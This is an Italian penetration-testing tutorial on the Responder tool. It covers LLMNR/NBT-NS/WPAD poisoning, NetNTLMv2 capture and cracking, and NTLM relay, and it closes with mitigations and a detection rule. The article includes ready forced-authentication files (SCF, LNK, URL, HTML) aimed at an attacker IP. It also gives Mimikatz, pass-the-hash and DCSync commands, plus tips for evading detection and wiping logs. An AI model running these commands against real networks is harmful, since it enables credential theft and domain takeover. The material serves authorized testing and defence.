---
title: 'Responder: Cattura Hash NTLM su Linux, LLMNR, NBT-NS e Relay'
slug: responder
description: 'Guida pratica a Responder: cattura hash NTLM/NetNTLMv2 tramite LLMNR, NBT-NS e WPAD, con cracking e NTLM relay in penetration test e lab.'
image: /responder.webp
draft: false
date: 2026-01-22T00:00:00.000Z
lastmod: 2026-09-15T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - responder
  - LLMNR Poisoning
  - NBT-NS Poisoning
  - NTLM Relay
  - Active Directory
---

# Responder: Guida Pratica a Poisoning LLMNR/NBT-NS, NTLM Capture e Relay

Responder forza sistemi Windows a rivelare le proprie credenziali sfruttando i meccanismi di fallback della risoluzione nomi (LLMNR, NBT-NS, mDNS) e connessioni SMB non verificate. In questa guida: setup → forced authentication → poisoning → capture NetNTLMv2 → cracking → relay → attack chain su Active Directory → troubleshooting.

## Responder Cheatsheet

| Obiettivo              | Comando                            |
| ---------------------- | ---------------------------------- |
| Analyze mode (passivo) | `responder -I eth0 -A`             |
| Poisoning LLMNR/NBT-NS | `responder -I eth0 -wrf`           |
| Attacco WPAD           | `responder -I eth0 -wFb`           |
| Verbose                | `-v`                               |
| Interfaccia            | `-I eth0`                          |
| Configurazione         | `Responder.conf`                   |
| Log catturati          | `logs/`                            |
| Relay (con MultiRelay) | `MultiRelay.py -t <target> -u ALL` |

## Cos'è Responder e Cosa Cattura Realmente

Responder è un tool di poisoning e rogue-service che risponde alle richieste di risoluzione nomi non autenticate (LLMNR, NBT-NS, mDNS) fingendosi la risorsa cercata, e mette in piedi server fake (SMB, HTTP, FTP, SQL, ecc.) per raccogliere l'autenticazione che ne consegue.

### NTLM vs NetNTLMv2: cosa cattura davvero Responder

Quello che Responder raccoglie **non è l'hash NTLM statico** memorizzato sul sistema (quello si estrae con Mimikatz o [secretsdump](https://hackita.it/articoli/secretsdump/)), ma un **NetNTLMv2 challenge-response**: un valore calcolato al momento dell'autenticazione a partire dall'hash NTLM dell'utente più un challenge casuale. Per questo NetNTLMv2:

* non è direttamente riutilizzabile per pass-the-hash — va prima craccato offline per ottenere la password in chiaro, oppure sfruttato subito via relay prima che scada;
* è più lento da craccare dell'NTLM puro, perché il formato include il challenge nel calcolo dell'hash.

Chi cerca "responder ntlm hash" spesso si aspetta un NTLM riutilizzabile: nella pratica quasi sempre è NetNTLMv2, ed è questa distinzione che decide se il passo successivo è cracking o relay.

## Prerequisiti: Quando Responder Può Funzionare

* Sei sullo stesso segmento di rete raggiungibile dalla vittima (LLMNR/NBT-NS/mDNS sono multicast locale, non attraversano un router).
* Il protocollo di fallback (LLMNR e/o NBT-NS) è ancora abilitato sui client — su reti hardenate potrebbe essere disattivato.
* L'autenticazione NTLM è ancora consentita (non forzata solo su Kerberos).
* Il tuo IP è raggiungibile dalla vittima sulle porte usate dai rogue server (445, 139, 80, 443 a seconda dei moduli attivi).
* Il target non ha SMB signing/hardening che blocca il relay verso quello specifico servizio (il poisoning e la capture restano possibili comunque, cambia solo cosa puoi fare con l'hash).

## Responder Attack Flow

```text
Network Recon
     |
Identify LLMNR/NBT-NS/mDNS/WPAD attivi
     |
Responder Analyze Mode (-A)
     |
Poisoning (-wrf / -wFb)
     |
NTLM Authentication forzata
     |
NetNTLMv2 Capture
     |
   +--------+--------+
   |                 |
Cracking           Relay
   |                 |
Credenziali       Accesso remoto
   |                 |
Pass-the-Hash     Lateral Movement
                      |
                  AD Attack Path
```

## Setup Lab

**Attacker (Kali):** 192.168.1.100 — Responder, John, Hashcat
**Target (Windows 10/11):** 192.168.1.50 — utente locale o di dominio

```bash
cd /opt
sudo git clone https://github.com/lgandx/Responder.git
cd Responder
sudo python3 Responder.py -I eth0 -v
```

## Fase 1 — Analyze Mode

Prima di poisonare qualsiasi cosa, osserva la rete passivamente: `-A` disabilita le risposte, solo monitoring.

```bash
sudo python3 Responder.py -I eth0 -A
```

Cosa guardare: quali host generano più richieste LLMNR/NBT-NS, quali nomi vengono cercati (errori di battitura ricorrenti), presenza di richieste WPAD, orari di picco.

```bash
cat /opt/Responder/logs/Analyze* | grep "Name:" | sort | uniq -c | sort -rn
```

```text
  47 Name: filesrv
  23 Name: wpad
  12 Name: printserver
```

`filesrv` cercato 47 volte è un nome candidato per typo-poisoning mirato — con `RespondTo` in `Responder.conf` puoi rispondere solo a quello, riducendo il rumore generato.

## Fase 2 — Poisoning LLMNR / NBT-NS / mDNS

```bash
sudo python3 Responder.py -I eth0 -wrf
```

`-w` abilita il rogue WPAD, `-r` risponde a LLMNR, `-f` forza l'autenticazione NTLM sui fake server. Da versioni recenti Responder risponde anche a mDNS (UDP 5353), utile in reti dove i client fanno fallback lì prima ancora di LLMNR.

**Trigger tipici (nessuno garantito, dipendono da configurazione e comportamento utente):**

* Typo in un percorso di rete: `\\filesrvv\docs` invece di `\\filesrv\docs` fa fallire la risoluzione DNS e scatta il fallback LLMNR/NBT-NS.
* Browser che cerca `wpad.dat` all'avvio, se WPAD non è esplicitamente disabilitato.
* Applicazioni mal configurate che cercano risorse di rete inesistenti.

Lasciando Responder attivo per un periodo prolungato su una rete enterprise attiva è realistico raccogliere più capture da utenti diversi nell'arco di ore, non di rado i primi risultati arrivano entro 15-30 minuti — ma dipende interamente da quanto traffico di risoluzione nomi "fallisce" naturalmente in quella rete.

## Forced Authentication Techniques

Sono metodi diversi per provocare un'autenticazione verso Responder, non tecniche scollegate: tutte finiscono nello stesso punto della attack flow (NTLM Authentication → capture).

### UNC Path

Il modo più diretto, utile in scenari con accesso fisico o social engineering diretto:

```
\\192.168.1.100\share
```

Da Explorer (barra indirizzi) o da riga di comando:

```cmd
dir \\192.168.1.100\test
```

```powershell
ls \\192.168.1.100\share
```

`net use \\192.168.1.100\IPC$` è una variante meno sospetta perché IPC$ è uno share amministrativo standard.

### SCF

Un file `.scf` (Shell Command File) piazzato in una cartella condivisa può provocare un'autenticazione senza interazione esplicita dell'utente in determinate configurazioni: quando Explorer renderizza l'icona referenziata, tenta di caricarla dal percorso UNC indicato.

```ini
[Shell]
Command=2
IconFile=\\192.168.1.100\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

### LNK

Un collegamento `.lnk` con icona remota ha lo stesso effetto: se Explorer genera l'anteprima (default su Windows 10/11), tenta il caricamento dell'icona e autentica.

```powershell
$path = "C:\Users\Public\Documents\Important.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($path)
$Shortcut.TargetPath = "\\192.168.1.100\share\file.txt"
$Shortcut.IconLocation = "\\192.168.1.100\share\icon.ico"
$Shortcut.Save()
```

### URL

Un file `.url` con icona remota funziona sullo stesso principio:

```ini
[InternetShortcut]
URL=http://www.google.com
IconFile=\\192.168.1.100\share\favicon.ico
IconIndex=0
```

### HTML / Risorsa Remota

Un tag immagine con percorso UNC in un HTML aperto localmente o via browser prova a caricare la risorsa via SMB:

```html
<img src="\\192.168.1.100\share\logo.png" alt="Logo">
```

### Documento Office con Risorsa Remota

Un'immagine collegata (non incorporata) in un `.docx`, con path impostato su `\\192.168.1.100\share\image.jpg`, forza lo stesso comportamento all'apertura del documento — è il vettore più realistico in un contesto di phishing mirato.

### Tabella riepilogativa

| Tecnica             | Trigger                             | Credenziale              | Next Step       |
| ------------------- | ----------------------------------- | ------------------------ | --------------- |
| UNC Path            | Connessione SMB manuale             | NetNTLMv2                | Crack / Relay   |
| SCF                 | Explorer carica risorsa in cartella | NetNTLMv2                | Crack / Relay   |
| LNK                 | Anteprima icona in Explorer         | NetNTLMv2                | Crack / Relay   |
| URL                 | Apertura file .url                  | NetNTLMv2                | Crack / Relay   |
| HTML/IMG            | Rendering immagine con path UNC     | NetNTLMv2                | Crack / Relay   |
| Office remote image | Apertura documento                  | NetNTLMv2                | Crack / Relay   |
| LLMNR/NBT-NS        | Risoluzione nome fallita            | NetNTLMv2                | Crack / Relay   |
| WPAD                | Ricerca proxy all'avvio browser     | NTLM (o chiaro con `-b`) | Capture / Relay |

## Attacco WPAD

```bash
sudo python3 Responder.py -I eth0 -wFb
```

`-w` abilita il rogue WPAD proxy, `-F` forza l'autenticazione sulla richiesta di `wpad.dat`, `-b` usa Basic Auth al posto di NTLM — attenzione, con Basic Auth la password passa in chiaro, non come hash.

Sequenza tipica: il browser cerca `wpad.corp.local` via DNS, fallisce, fa fallback LLMNR cercando "wpad"; Responder risponde da autorità, il browser richiede `wpad.dat`, Responder richiede prima l'autenticazione, il browser la fornisce.

```text
[LLMNR]  Poisoned answer sent to 192.168.1.25 for name wpad
[HTTP] NTLMv2 Client   : 192.168.1.25
[HTTP] NTLMv2 Username : CORP\john.doe
[HTTP] NTLMv2 Hash     : john.doe::CORP:1122334455667788:E8D3F1A9...
```

Per la fase di scanning della rete che precede questi attacchi vedi la [guida Netcat](https://hackita.it/articoli/netcat/) per test di connettività rapidi sulle porte coinvolte.

## Cracking degli Hash Catturati

```bash
cd /opt/Responder/logs
cat SMB-NTLMv2-SSP-*.txt > all_hashes.txt
```

**John the Ripper:**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt all_hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 all_hashes.txt
```

Wordlist mirata sull'azienda target:

```bash
cewl -d 3 -m 6 https://targetcompany.com -w company_words.txt
john --wordlist=company_words.txt --rules=KoreLogic all_hashes.txt
```

**Hashcat** (molto più veloce con GPU, modalità 5600 per NetNTLMv2):

```bash
hashcat -m 5600 all_hashes.txt /usr/share/wordlists/rockyou.txt

# Mask attack su pattern aziendali comuni (Maiuscola+minuscole+numeri+simbolo)
hashcat -m 5600 all_hashes.txt -a 3 ?u?l?l?l?l?d?d?d?d!
```

```bash
john --show all_hashes.txt
```

Consulta [John the Ripper](https://hackita.it/articoli/john-the-ripper/) e [Hashcat](https://hackita.it/articoli/hashcat/) per le tecniche di cracking avanzate.

## Responder vs ntlmrelayx: Qual È la Differenza?

Sono due strumenti complementari, non alternativi: Responder cattura (poisoning + rogue service), [ntlmrelayx](https://hackita.it/articoli/ntlmrelayx/) inoltra l'autenticazione a un target reale in tempo reale, prima che si esaurisca.

| Tool                 | Funzione                                               |
| -------------------- | ------------------------------------------------------ |
| Responder            | Poisoning, rogue service, capture NetNTLMv2            |
| ntlmrelayx           | Relay dell'autenticazione verso un servizio reale      |
| CrackMapExec/NetExec | Enumeration, validazione credenziali, lateral movement |
| Impacket             | Toolkit di esecuzione/autenticazione/tooling AD        |

## Responder + ntlmrelayx: Il Relay Workflow

Per il relay, Responder deve smettere di rispondere lui stesso su SMB/HTTP (altrimenti intercetta l'autenticazione invece di lasciarla passare al relay tool):

```bash
nano /opt/Responder/Responder.conf
```

```ini
[Responder Core]
SMB = Off
HTTP = Off
```

**Terminal 1 — Responder (solo poisoning):**

```bash
sudo python3 Responder.py -I eth0 -rv
```

**Terminal 2 — relay verso un target senza SMB signing:**

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support
```

Prima di scegliere i target, verifica quali host hanno SMB signing disabilitato (senza signing il relay verso quel servizio è possibile, con signing abilitato no):

```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt
```

Se l'utente il cui NetNTLMv2 viene relayato ha privilegi amministrativi sul target, il relay tool apre una sessione con quei privilegi — è un vettore di accesso, non un bypass automatico di ogni protezione: se il target ha SMB signing attivo il relay verso quello specifico host semplicemente non parte.

## NTLM Relay Oltre SMB: LDAP e ADCS

Il relay non si ferma a SMB. Se il servizio target lo consente, la stessa autenticazione intercettata può essere relayata verso:

```text
Responder
   |
NTLM authentication
   |
Relay
   +-- SMB
   +-- LDAP / LDAPS
   +-- HTTP
   +-- altri servizi compatibili con autenticazione NTLM
```

Relay verso LDAP/LDAPS è particolarmente rilevante quando in rete è presente un [AD CS](https://hackita.it/articoli/ad-cs/): un'autenticazione relayata su LDAPS combinata con un template ADCS mal configurato può portare a un attack path completo — argomento che approfondiamo nell'articolo dedicato ad AD CS, qui resta un ramo avanzato da tenere presente più che una guida completa.

## Post-Compromise Attack Paths

Responder è un abilitatore di credential access e relay, non uno strumento di privilege escalation in sé: quello che segue dipende da cosa ottieni con l'hash o con l'accesso relayato.

**Ramo A — cracking:**

```text
Responder -> NetNTLMv2 -> Hashcat -> password in chiaro -> account valido
```

**Ramo B — relay SMB:**

```text
Responder -> NTLM Relay -> SMB -> accesso remoto
```

**Ramo C — relay LDAP/LDAPS:**

```text
Responder -> NTLM Relay -> LDAP/LDAPS -> AD attack path (vedi AD CS)
```

**Ramo D — credenziali in memoria dopo accesso:**

```text
Accesso ottenuto -> dump credenziali (Mimikatz) -> nuovo hash NTLM -> pass-the-hash -> lateral movement
```

Esempio concreto del Ramo D, con [Mimikatz](https://hackita.it/articoli/mimikatz/) eseguito dopo aver ottenuto shell su una workstation:

```
mimikatz # sekurlsa::logonpasswords

User Name         : DA_Admin
Domain            : CORP
NTLM              : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

Se quell'hash appartiene a un Domain Admin loggato sulla workstation, il passo successivo è [pass-the-hash](https://hackita.it/articoli/pass-the-hash/) verso il Domain Controller:

```bash
impacket-psexec -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 CORP/DA_Admin@192.168.1.10
```

E da lì, [DCSync](https://hackita.it/articoli/dcsync/) per dumpare l'intero database credenziali del dominio:

```bash
impacket-secretsdump CORP/DA_Admin@192.168.1.10 -hashes :a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
```

Se in dominio, il [Kerberoasting](https://hackita.it/articoli/kerberoasting/) è un'alternativa al cracking NetNTLMv2 quando l'hash catturato non si rompe: prendi di mira direttamente i service account.

## Tecniche Stealth e Defense Evasion

**Limitare il poisoning a nomi specifici**, riducendo il rumore generato:

```ini
[Responder Core]
RespondTo = filesrv,wpad,printserver
```

**Finestra temporale**, per operare solo durante l'orario lavorativo (in engagement autorizzati, coordina sempre con il cliente):

```bash
echo "0 9 * * 1-5 cd /opt/Responder && python3 Responder.py -I eth0 -wrf > /dev/null 2>&1" | crontab -
echo "0 18 * * 1-5 pkill -f Responder.py" | crontab -a
```

**Cambiare il challenge di default** (`1122334455667788`), su cui alcuni IDS basano il rilevamento:

```ini
[Responder Core]
Challenge = AABBCCDDEEFF0011
```

**Cleanup dopo la sessione:**

```bash
cd /opt/Responder/logs
shred -vfz -n 10 *.txt
rm Responder.db
```

Nessuna di queste tecniche rende Responder invisibile: un IDS/IPS con detection sul poisoning multicast o sugli Event ID 4648 continua a vedere l'attività, riduci solo la superficie e il rumore.

## Troubleshooting: Perché Responder Non Cattura Hash

```text
Responder avviato
      |
Interfaccia corretta?
      |
Target raggiungibile? (stesso segmento)
      |
LLMNR/NBT-NS/mDNS ancora abilitati sul client?
      |
Poisoning ricevuto dal client?
      |
Client tenta autenticazione NTLM?
      |
Listener SMB/HTTP attivo sulla porta giusta?
      |
Hardening/NTLM blocking sul client?
```

Verifiche pratiche in ordine:

1. **Firewall Kali blocca le porte** — `sudo ufw status`, verifica 445/137/5355/5353 aperte.
2. **Responder è davvero in ascolto** — `sudo netstat -tulpn | grep python`.
3. **Raggiungibilità di rete** — `ping 192.168.1.100` dal lato vittima.
4. **Firewall lato Windows blocca SMB outbound** — raro ma possibile in ambienti hardenati.
5. **LLMNR/NBT-NS disabilitati via GPO** — se la rete è già hardenata secondo le mitigazioni più sotto, il fallback non scatta mai: serve un altro vettore (forced authentication diretta invece di poisoning passivo).
6. **MultiRelay/ntlmrelayx non parte per errore di libreria** — `pip3 install pycryptodome`, oppure usa `impacket-ntlmrelayx` al posto di MultiRelay se il problema persiste.

## MITRE ATT\&CK

* **T1557.001** — Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay (tattica Credential Access), copre anche il poisoning mDNS nelle versioni aggiornate della tecnica.
* **T1187** — Forced Authentication (tattica Credential Access): copre i vettori SCF/LNK/URL/documento con risorsa remota.
* **T1550.002** — Use Alternate Authentication Material: Pass the Hash.
* **T1003.006** — OS Credential Dumping: DCSync.

Verifica sempre gli ID correnti su [attack.mitre.org](https://attack.mitre.org) prima di citarli in un report: la matrice viene aggiornata periodicamente.

## Alternative a Responder

| Tool                                                  | Quando usarlo                                                        |
| ----------------------------------------------------- | -------------------------------------------------------------------- |
| Responder                                             | LLMNR/NBT-NS/mDNS/WPAD poisoning da Linux                            |
| Inveigh                                               | Poisoning equivalente da host Windows (PowerShell/.NET)              |
| [ntlmrelayx](https://hackita.it/articoli/ntlmrelayx/) | Relay puro dell'autenticazione NTLM                                  |
| mitm6                                                 | Poisoning IPv6/DHCPv6 abbinato ad attacchi AD                        |
| Pretender                                             | Spoofing/name resolution più recente, alternativa attiva a Responder |

## Mitigazioni

**Disabilitare i protocolli di fallback:**

```
gpedit.msc → Computer Configuration → Administrative Templates → Network → DNS Client
→ Turn OFF Multicast Name Resolution = Enabled
```

```powershell
Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True" | ForEach-Object {
    $_.SetTcpipNetbios(2)  # 2 = Disable
}
```

**SMB signing obbligatorio** (la mitigazione più efficace contro il relay):

```
gpedit.msc → Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options
→ Microsoft network client: Digitally sign communications (always)
→ Microsoft network server: Digitally sign communications (always)
```

```powershell
Get-SmbServerConfiguration | Select EnableSecuritySignature,RequireSecuritySignature
```

**Segmentazione:** isola i Domain Controller su una VLAN con SMB signing obbligatorio e traffico da workstation limitato alle porte strettamente necessarie.

**Detection minima:**

* Sysmon: alert su connessioni verso UDP 5355 (LLMNR) e 137 (NBT-NS).
* Query su spike di query di risoluzione nomi da un singolo host in una finestra breve.
* Windows Event ID 4648 (credenziali esplicite) in aumento anomalo.

```yaml
title: Responder LLMNR/NBT-NS Poisoning
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 3
        DestinationPort: [5355, 137, 5353]
    condition: selection
```

## Checklist Engagement

**Pre-attacco:** Responder aggiornato, IP attacker raggiungibile dal target, logging completo (`-v`), file weaponizzati pronti se previsti dallo scope.

**Durante:** listener sull'interfaccia corretta, monitoraggio log in tempo reale (`tail -f logs/*.txt`), ogni hash documentato con timestamp/IP/username, SMB signing verificato prima di qualsiasi relay.

**Post-exploitation:** log copiati in storage sicuro, catena di attacco documentata end-to-end, cleanup di Responder e delle tracce lasciate.

**Reporting:** credenziali compromesse, evidenze di relay riuscito, raccomandazioni prioritizzate per rischio.

## FAQ

**Cos'è Responder?**
Un tool che risponde alle richieste di risoluzione nomi LLMNR/NBT-NS/mDNS non autenticate e mette in piedi rogue service per catturare l'autenticazione NTLM che ne consegue.

**Responder cattura NTLM o NetNTLMv2?**
Quasi sempre NetNTLMv2: un challenge-response calcolato al momento, non l'hash NTLM statico. Va craccato o relayato, non riutilizzato direttamente come nel pass-the-hash.

**Qual è la differenza tra poisoning LLMNR e NBT-NS?**
Sono due protocolli di fallback diversi (LLMNR su UDP 5355, NBT-NS su UDP 137) usati da Windows quando il DNS fallisce; Responder li poisona entrambi insieme, spesso con l'aggiunta di mDNS su UDP 5353.

**Responder può fare SMB relay da solo?**
No: Responder cattura, il relay verso un target reale richiede un tool dedicato come ntlmrelayx (o MultiRelay), configurato per non intercettare lui stesso l'autenticazione su SMB/HTTP.

**Perché Responder non cattura hash sulla mia rete?**
Nella maggior parte dei casi: LLMNR/NBT-NS sono già disabilitati via GPO, il traffico non raggiunge il tuo segmento, o un firewall blocca le porte dei rogue server — vedi la sezione troubleshooting sopra.

***

**Disclaimer legale:** le tecniche descritte sono per scopi educativi e penetration testing autorizzato. Usare Responder su reti che non possiedi o senza consenso scritto esplicito costituisce reato. Ottieni sempre autorizzazione formale documentata prima di qualsiasi test.
